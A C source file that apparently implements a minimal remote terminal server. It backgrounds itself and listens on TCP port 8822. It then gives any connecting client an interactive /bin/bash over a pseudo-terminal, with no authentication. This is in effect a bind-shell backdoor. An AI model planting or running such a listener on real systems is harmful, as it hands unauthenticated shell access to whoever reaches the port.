#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <util.h>
#include <fcntl.h>
#include <poll.h>
int pid;
void handler() {
	if (pid)
        kill(-pid, SIGINT);
}

int main() {
    if ((pid = fork())) {
    	signal(SIGINT, &handler); 
    	wait(NULL);
    	return 0;   
    } else {
		int status, sd, new_sd;
		struct addrinfo hints, *res;
		struct sockaddr_storage sock_stor;
        setsid();

		memset(&hints, 0, sizeof(hints));
		hints.ai_family = AF_UNSPEC;    
		hints.ai_socktype = SOCK_STREAM;	
		hints.ai_flags = AI_PASSIVE;   

		if ((status = getaddrinfo(NULL, "8822", &hints, &res)) != 0) {
			perror("error getaddrfinfo");
		    return 1;
	    } 
		if ((sd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {
			perror("error socket");
		    return 2;
	    } 

	    status = 1;
	    if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &status, sizeof(int)) == -1) {
	    	close(sd);
	    	perror("setsockopt fail");
	    	return 3;
	    }

	    if (bind(sd, res->ai_addr, res->ai_addrlen) == -1) {
	    	close(sd);
	    	perror("bind fail");
	    	return 4;
	    }
	    
	    if (listen(sd, 5) == -1) {
	    	close(sd);
	    	perror("listen fail");
	    	return 5;
	    }
		while (1) {
            socklen_t addr_size = sizeof(sock_stor);
			if ((new_sd = accept(sd, (struct sockaddr *) &sock_stor, &addr_size)) == -1) {
		    	close(sd);
		    	perror("accept fail");
		    	return 6;
		    }
		    if (fork()) {
		        close(new_sd);
		    } else {
                close(sd);
                int master, slave;
                char buffer[4096];
                if (openpty(&master, &slave, buffer, NULL, NULL) != 0) {
                    close(new_sd);
                    return 7;
                }
                if (fork()) {
                	close(slave);
	                char buf1[4096];
	                fcntl(master, F_SETFL, fcntl(master, F_GETFL) | O_NONBLOCK);
	                fcntl(new_sd, F_SETFL, fcntl(new_sd, F_GETFL) | O_NONBLOCK); 
	                while(1) {
	                    int sz = read(master, buf1, 4096);
	                    if(sz > 0) {
	                        write(new_sd, buf1, sz); 
	                    }
	                    sz = read(new_sd, buf1, 4096);
	                    if(sz > 0) {
	                        write(master, buf1, sz); 
	                    }
	                    sleep(1);
	                }
                } else {
                    close(master);
	                dup2(slave, 0);
	                dup2(slave, 1);
	                dup2(slave, 2);
	                setsid();
	                close(new_sd);
	                int ff = open(buffer, O_RDWR);
	                if(ff)
	                    close(ff);
	                execl("/bin/bash", "/bin/bash", NULL);
	                return 0;
                }
		        return 0;
		    }
            close(new_sd);
            return 0;
		}
	    
	    close(sd);
	    return 0;

    }
}
